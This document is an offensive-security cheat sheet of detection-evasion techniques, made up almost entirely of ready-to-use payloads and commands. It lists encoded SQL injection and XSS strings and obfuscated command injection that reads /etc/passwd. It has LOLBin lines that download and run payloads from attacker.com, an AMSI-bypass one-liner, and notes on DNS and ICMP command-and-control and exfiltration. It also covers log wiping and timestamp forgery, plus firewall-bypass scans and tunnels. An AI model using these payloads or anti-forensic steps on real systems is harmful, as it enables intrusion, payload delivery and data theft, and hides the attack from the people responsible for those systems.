# Evasion Techniques — Advanced Detection Avoidance

## WAF Bypass Techniques

### Encoding Chains
```
# URL encode once
%27 OR %271%27%3D%271

# Double URL encode
%2527 OR %25271%2527%253D%25271

# HTML entity encode (in reflected contexts)
&#x27; OR &#x27;1&#x27;=&#x27;1

# Unicode (some WAFs don't normalize)
ʼ OR ʼ1ʼ=ʼ1
＇ OR ＇1＇=＇1   # Fullwidth apostrophe

# Hex encoding for MySQL
0x61646d696e  # 'admin' in hex
SELECT 0x61646d696e  # = SELECT 'admin'
```

### Comment & Whitespace Abuse
```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users     # Tab as whitespace
SELECT%0ausername%0aFROM%0ausers     # Newline
SE/**/LE/**/CT username FROM users
```

### HTTP-Level Bypass
```
# HTTP verb tampering
GET /admin → POST /admin → PUT /admin

# Header injection
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1

# Content-Type confusion
Content-Type: application/json; charset=ibm037

# Chunked transfer encoding (bypass body inspection)
Transfer-Encoding: chunked
```

### Parameter Pollution
```
# HTTP Parameter Pollution
?user=attacker&user=admin
/api/v1/users?role=user&role=admin
```

---

## Payload Obfuscation

### XSS Obfuscation
```javascript
// eval variants
eval(atob('YWxlcnQoMSk='))                // base64: alert(1)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// Event handlers beyond onerror/onload
<svg onbegin=alert(1)>
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

// Protocol handlers
javascript:alert(1)
JaVaScRiPt:alert(1)
&#106;avascript:alert(1)
java&#9;script:alert(1)  # tab

// Template literal
`${alert(1)}`

// Mutation XSS (mXSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### Command Injection Obfuscation
```bash
# Character substitution
c''at /etc/passwd
c"a"t /etc/passwd

# Variable insertion (bash)
c${}at /etc/passwd
ca${IFS}t${IFS}/etc/passwd

# Encoding
$(printf '\x63\x61\x74') /etc/passwd   # 'cat'
$('\x63\x61\x74') /etc/passwd

# Backtick nesting
`c\`a\`t /etc/passwd`

# Wildcards
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
```

---

## AV / EDR Evasion

### Windows LOLBins (Living off the Land)
```cmd
# Download and execute
certutil -urlcache -f http://attacker.com/payload.exe C:\Windows\Temp\p.exe
bitsadmin /transfer job http://attacker.com/payload.exe C:\Windows\Temp\p.exe
mshta http://attacker.com/payload.hta
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
rundll32 javascript:"\..\mshtml,RunHTMLApplication";...
```

### PowerShell Obfuscation
```powershell
# Invoke-Obfuscation framework
# Or manual:

# Concatenation
iEx ( 'Inv'+'oke-'+'Expres'+'sion' )

# Base64 encode entire command
$cmd = 'Write-Host "pwned"'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $enc

# String reversal
$r = 'noisserpmoCedoC-ekovnI'; -join($r[-1..-($r.Length)])

# AMSI bypass (memory patch)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Process Injection
```csharp
// Hollow Process Injection (C#)
// 1. Create process in suspended state
// 2. Unmap legitimate image
// 3. Write malicious payload
// 4. Resume thread

// Reflective DLL Injection
// Load DLL from memory without touching disk
```

---

## Network Evasion

### Scan Timing & Rate Control
```bash
# Slow scan (avoid IDS threshold)
nmap --max-rate 10 --scan-delay 1s target.com

# Decoy scanning
nmap -D RND:10 target.com       # Random decoys
nmap -D 8.8.8.8,1.1.1.1 target  # Specific decoys

# Fragmented packets
nmap -f target.com
nmap --mtu 8 target.com

# Idle scan (truly blind)
nmap -sI zombie_host target.com
```

### C2 Traffic Blending
```
# DNS C2 (exfiltrate via DNS queries)
data.attacker.com TXT lookups with base64 encoded data

# HTTPS C2 with malleable profiles
# Mimic: Google Analytics, Microsoft Update, Dropbox API

# Domain Fronting
# Use CDN (Cloudfront, Cloudflare) with trusted SNI

# ICMP tunneling
icmpsh, ptunnel-ng

# DNS over HTTPS C2
doh-c2 — wrap C2 traffic in DoH queries to 8.8.8.8
```

---

## Anti-Forensics

### Log Evasion
```bash
# Unset bash history
unset HISTFILE
export HISTFILE=/dev/null

# Overwrite log file
> /var/log/auth.log

# Timestamp manipulation
touch -t 202001010000 malicious_file

# Delete specific log entries (careful - may cause detection)
sed -i '/EVIL_PATTERN/d' /var/log/auth.log
```

### File System Stealth
```bash
# Alternate Data Streams (Windows NTFS)
echo malware > benign.txt:hidden_stream.exe

# Linux: hide in plain sight
mv malware ". "    # Trailing space in name
mkdir " "          # Space-named directory

# Temp directories with low monitoring
/tmp, /dev/shm, /var/tmp
```

---

## Firewall / IPS Bypass

### Port Manipulation
```bash
# Source port spoofing (some firewalls allow traffic FROM port 53/80/443)
nmap --source-port 53 target.com
hping3 -S -p 80 --sport 53 target.com

# TCP ACK scan to map stateful rules
nmap -sA target.com
```

### Protocol Tunneling
```bash
# DNS tunnel
iodine -f -P password dns.tunnel.attacker.com

# ICMP tunnel
ptunnel-ng -R -lp 1234 -da target.com -dp 22

# HTTP CONNECT tunnel through proxy
curl --proxy http://proxy:8080 http://internal-target
```
